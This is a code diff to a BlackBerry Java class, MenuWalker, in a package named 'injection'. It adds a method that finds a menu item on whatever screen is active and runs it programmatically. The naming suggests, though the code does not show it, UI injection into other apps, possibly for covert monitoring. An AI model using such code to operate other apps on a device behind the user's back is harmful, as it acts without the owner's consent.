@@ -12,6 +12,8 @@ package blackberry.injection;
 import net.rim.device.api.i18n.Locale;
 import net.rim.device.api.system.Application;
 import net.rim.device.api.ui.MenuItem;
+import net.rim.device.api.ui.Screen;
+import net.rim.device.api.ui.Ui;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.component.Menu;
 import blackberry.config.Conf;
@@ -26,6 +28,28 @@ public class MenuWalker {
     static Locale prev;
     static Locale locale;
 
+    public static void walk(String menuItemText) {
+        Screen screen = Ui.getUiEngine().getActiveScreen();
+        
+      //#ifdef DEBUG
+        Debug debug = new Debug("MenuWalkerRun", DebugLevel.VERBOSE);
+        //#endif
+        
+        setLocaleBegin();
+        
+        Menu menu = screen.getMenu(0);
+        for (int i = 0, cnt = menu.getSize(); i < cnt; i++){
+            if (menu.getItem(i).toString().equalsIgnoreCase(menuItemText)){                
+                //#ifdef DEBUG
+                debug.info("Press Menu: " + menuItemText);
+                //#endif
+            
+                menu.getItem(i).run();
+            }
+        }
+        
+        setLocaleEnd();
+    }
     /**
      * Walk the menu and runs the item specified. Descriptions are english
      * locale.
@@ -33,7 +57,7 @@ public class MenuWalker {
      * @param menuDesc
      *            the menu desc
      */
-    public synchronized static void walk(final String[] menuDescriptions) {
+/*    public synchronized static void walk(final String[] menuDescriptions) {
 
         if (!Conf.IS_UI) {
             //#ifdef DEBUG
@@ -91,7 +115,7 @@ public class MenuWalker {
             }
         });
 
-    }
+    }*/
 
     /**
      * Sets the locale end.
@@ -108,7 +132,7 @@ public class MenuWalker {
      * 
      * @return the locale
      */
-    public static Locale setLocaleStart() {
+    public static Locale setLocaleBegin() {
         //#ifdef DEBUG
         debug.trace("setLocaleStart");
         //#endif
